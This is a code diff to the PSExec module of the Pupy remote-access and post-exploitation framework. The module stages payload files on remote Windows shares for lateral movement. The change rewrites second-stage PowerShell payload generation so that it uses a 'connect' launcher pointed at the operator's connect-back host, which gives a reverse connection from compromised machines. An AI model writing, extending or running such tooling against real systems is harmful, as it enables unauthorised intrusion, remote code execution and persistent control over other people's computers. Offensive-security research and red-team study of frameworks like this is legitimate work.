@@ -3,17 +3,18 @@
 # Version used from the "rewrite" branch of smbexec written by byt3bl33d3r
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
+from rpyc.utils.classic import upload
+from subprocess import PIPE, Popen
+from base64 import b64encode
 import pupygen
-import re
-import os
 import tempfile
 import random
 import string
-from rpyc.utils.classic import upload
 import shutil
-from subprocess import PIPE, Popen
-import time
 import ntpath
+import time
+import re
+import os
 
 __class_name__="PSExec"
 
@@ -70,7 +71,7 @@ class PSExec(PupyModule):
                 remote_path = '%s\\' % self.client.conn.modules['os.path'].expandvars("%ALLUSERSPROFILE%")
             else:
                 remote_path = '/tmp/'
-
+            
             # write on the temp directory
             if args.share == 'C$':
                 dst_folder = "C:\\Windows\\TEMP\\"
@@ -106,10 +107,9 @@ class PSExec(PupyModule):
                 self.success('first stage created: %s' % os.path.join(tmp_dir, first_stage))
 
                 tmpfile = tempfile.gettempdir()
-                output  = pupygen.generate_ps1(self.config, output_dir=tmpfile, all=True)
-                command = output.read()
-                
-                open(os.path.join(tmp_dir, second_stage), 'w').write(command)
+                output  = pupygen.generate_ps1(conf={'launcher':'connect', 'launcher_args': ['--host', self.client.conn.modules['pupy'].get_connect_back_host()]}, output_dir=tmpfile, both=True)
+                os.rename(output, os.path.join(tmp_dir, second_stage))
+
                 self.success('second stage created: %s' % os.path.join(tmp_dir, second_stage))
 
             for file in file_to_upload:
